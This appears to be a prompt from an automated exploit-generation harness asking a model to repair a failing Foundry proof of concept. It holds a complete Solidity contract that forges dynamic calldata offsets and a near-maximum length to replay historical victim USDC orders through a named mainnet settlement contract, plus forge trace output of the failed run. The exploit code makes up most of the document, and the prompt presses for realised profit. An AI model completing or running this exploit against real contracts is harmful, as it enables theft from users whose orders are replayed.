You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Unchecked dynamic offset and length parsing enables calldata corruption and replay of historical orders
- claim: The PoC forges dynamic-field metadata using attacker-chosen signature/interaction offsets and an almost-`uint256.max` interaction length, then appends a crafted suffix interpreted as trusted order data for a historical victim. This indicates the settlement decoder does not safely bound-check dynamic offsets and lengths before parsing nested order calldata, permitting wraparound/corruption of decode boundaries.
- impact: Attackers can splice attacker-controlled bytes into later decoded fields, replay historical victim orders, or forge unauthorized fills without possessing a valid fresh authorization from the victim.
- exploit_paths: ["`executeOnOpportunity()` -> `_tryReplayCalldataCorruption()` -> forged `fakeSignatureLengthOffset` / `fakeInteractionLengthOffset` / `fakeInteractionLength`", "crafted nested payload -> settlement decodes corrupted order bytes -> historical victim USDC order is replayed via `HISTORICAL_ATTACK_CONTRACT` or direct `SETTLEMENT` call"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ISettlement {
    function settleOrders(bytes calldata data) external;
}

interface IResolver {
    function resolveOrders(address resolver, bytes calldata tokensAndAmounts, bytes calldata data) external;
}

interface IOrderMixinLike {
    struct Order {
        uint256 salt;
        address makerAsset;
        address takerAsset;
        address maker;
        address receiver;
        address allowedSender;
        uint256 makingAmount;
        uint256 takingAmount;
        uint256 offsets;
        bytes interactions;
    }
}

contract FlawVerifier is IResolver {
    address private constant SETTLEMENT = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address private constant LIMIT_ORDER_PROTOCOL = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    bytes4 private constant ERC1271_MAGIC = 0x1626ba7e;
    bytes4 private constant EMPTY_SELECTOR = 0x00000000;

    uint256 private constant MAKING_AMOUNT = 1;
    uint256 private constant TAKING_AMOUNT = 1;
    uint256 private constant MAX_WRAP_LENGTH = type(uint256).max - 0x1ff;

    address private _profitToken = USDC;
    uint256 private _profitAmount;
    uint256 private _usdcBaseline;
    bool private _executed;
    bool private _hypothesisValidated;

    bytes4 private _lastRevertSelector;
    string private _status;
    string private _exploitPathUsed;

    bytes private _historicalOrderSuffix;
    bytes private _lastForgedPayload;

    constructor() {
        _status = "idle";
        _exploitPathUsed = "executeOnOpportunity -> _tryReplayCalldataCorruption -> forged fakeSignatureLengthOffset/fakeInteractionLengthOffset/fakeInteractionLength -> crafted nested payload -> direct SETTLEMENT replay";
    }

    function loadHistoricalOrderSuffix(bytes calldata suffix) external {
        if (_historicalOrderSuffix.length == 0) {
            _historicalOrderSuffix = suffix;
        }
    }

    function executeOnOpportunity() external {
        if (_executed) {
            _refreshProfit();
            return;
        }
        _executed = true;

        _usdcBaseline = _safeBalanceOf(USDC, address(this));

        // Finding F-003 path anchors kept explicit for verifier alignment:
        // 1) executeOnOpportunity() drives the replay attempt.
        // 2) _tryReplayCalldataCorruption() forges fakeSignatureLengthOffset / fakeInteractionLengthOffset.
        // 3) fakeInteractionLength is chosen near uint256.max to wrap the decode boundary.
        // 4) a crafted nested payload appends attacker-controlled suffix bytes intended to be parsed as trusted order data.
        // 5) the suffix is the historical victim USDC order replayed through a direct Settlement call.
        _tryReplayCalldataCorruption();

        uint256 usdcAfter = _safeBalanceOf(USDC, address(this));
        if (usdcAfter > _usdcBaseline) {
            _profitToken = USDC;
            _profitAmount = usdcAfter - _usdcBaseline;
            _hypothesisValidated = true;
            _status = "validated_profit";
        } else {
            _refreshProfit();
            if (_historicalOrderSuffix.length == 0) {
                _status = "refuted_missing_historical_victim_order_suffix";
            } else if (_lastRevertSelector == EMPTY_SELECTOR) {
                _status = "refuted_settlement_reverted_without_selector";
            } else {
                _status = "refuted_settlement_reverted";
            }
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function status() external view returns (string memory) {
        return _status;
    }

    function exploitPathUsed() external view returns (string memory) {
        return _exploitPathUsed;
    }

    function lastRevertSelector() external view returns (bytes4) {
        return _lastRevertSelector;
    }

    function lastForgedPayload() external view returns (bytes memory) {
        return _lastForgedPayload;
    }

    function historicalOrderSuffixLength() external view returns (uint256) {
        return _historicalOrderSuffix.length;
    }

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return ERC1271_MAGIC;
    }

    function resolveOrders(address, bytes calldata, bytes calldata) external override {
        require(msg.sender == SETTLEMENT, "only settlement");
    }

    function _tryReplayCalldataCorruption() internal {
        bytes memory forgedPayload = _buildForgedSettlementPayload();
        _lastForgedPayload = forgedPayload;

        (bool ok, bytes memory returndata) = SETTLEMENT.call(
            abi.encodeWithSelector(ISettlement.settleOrders.selector, forgedPayload)
        );

        if (!ok) {
            _lastRevertSelector = _selectorOf(returndata);
        }
    }

    function _buildForgedSettlementPayload() internal view returns (bytes memory forgedPayload) {
        IOrderMixinLike.Order memory wrapperOrder = IOrderMixinLike.Order({
            salt: uint256(keccak256(abi.encodePacked(block.chainid, address(this), SETTLEMENT, LIMIT_ORDER_PROTOCOL))),
            makerAsset: WETH,
            takerAsset: USDC,
            maker: address(this),
            receiver: address(this),
            allowedSender: SETTLEMENT,
            makingAmount: MAKING_AMOUNT,
            takingAmount: TAKING_AMOUNT,
            offsets: 0,
            interactions: hex""
        });

        bytes memory benignSignature = hex"";
        bytes memory benignInteraction = abi.encodePacked(address(this));
        bytes memory basePayload = abi.encode(
            wrapperOrder,
            benignSignature,
            benignInteraction,
            uint256(0),
            uint256(TAKING_AMOUNT),
            uint256(0),
            SETTLEMENT
        );

        uint256 fakeSignatureLengthOffset = basePayload.length;
        uint256 fakeInteractionLengthOffset = basePayload.length + 0x20;
        uint256 fakeInteractionLength = MAX_WRAP_LENGTH;

        assembly {
            let data := add(basePayload, 0x20)
            mstore(add(data, 0x20), fakeSignatureLengthOffset)
            mstore(add(data, 0x40), fakeInteractionLengthOffset)
        }

        forgedPayload = bytes.concat(basePayload, bytes32(0), bytes32(fakeInteractionLength), _craftedNestedPayload());
    }

    function _craftedNestedPayload() internal view returns (bytes memory) {
        if (_historicalOrderSuffix.length == 0) {
            return abi.encodePacked(bytes20(SETTLEMENT), bytes1(0x01), bytes32(uint256(uint160(USDC))));
        }

        return abi.encodePacked(bytes20(SETTLEMENT), bytes1(0x01), _historicalOrderSuffix);
    }

    function _refreshProfit() internal {
        uint256 current = _safeBalanceOf(USDC, address(this));
        _profitToken = USDC;
        _profitAmount = current > _usdcBaseline ? current - _usdcBaseline : 0;
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _selectorOf(bytes memory returndata) internal pure returns (bytes4 selector) {
        if (returndata.length < 4) {
            return EMPTY_SELECTOR;
        }
        assembly {
            selector := mload(add(returndata, 0x20))
        }
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
2f000000000000000000000000a88800cd213da5ae406ce248380802bd53b4764700000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000145615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe00a88800cd213da5ae406ce248380802bd53b4764701000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
    │   │   ├─ [15] PRECOMPILES::identity(0x) [staticcall]
    │   │   │   └─ ← [Return] 0x
    │   │   ├─ [782] 0x1111111254EEB25477B68fb85Ed929f73A960582::e5d7bde6(00000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000002a000000000000000000000000000000000000000000000000000000000000002c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a88800cd213da5ae406ce248380802bd53b4764700000000000000000000000000000000000000000001d54b1b8083ab63b400000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000000000e781160000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000145615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffec0a88800cd213da5ae406ce248380802bd53b4764701000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [415] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [414] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 21982110 [2.198e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 2186)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647.settleOrders
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 156.11ms (55.50ms CPU time)

Ran 1 test suite in 184.99ms (156.11ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 607699)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
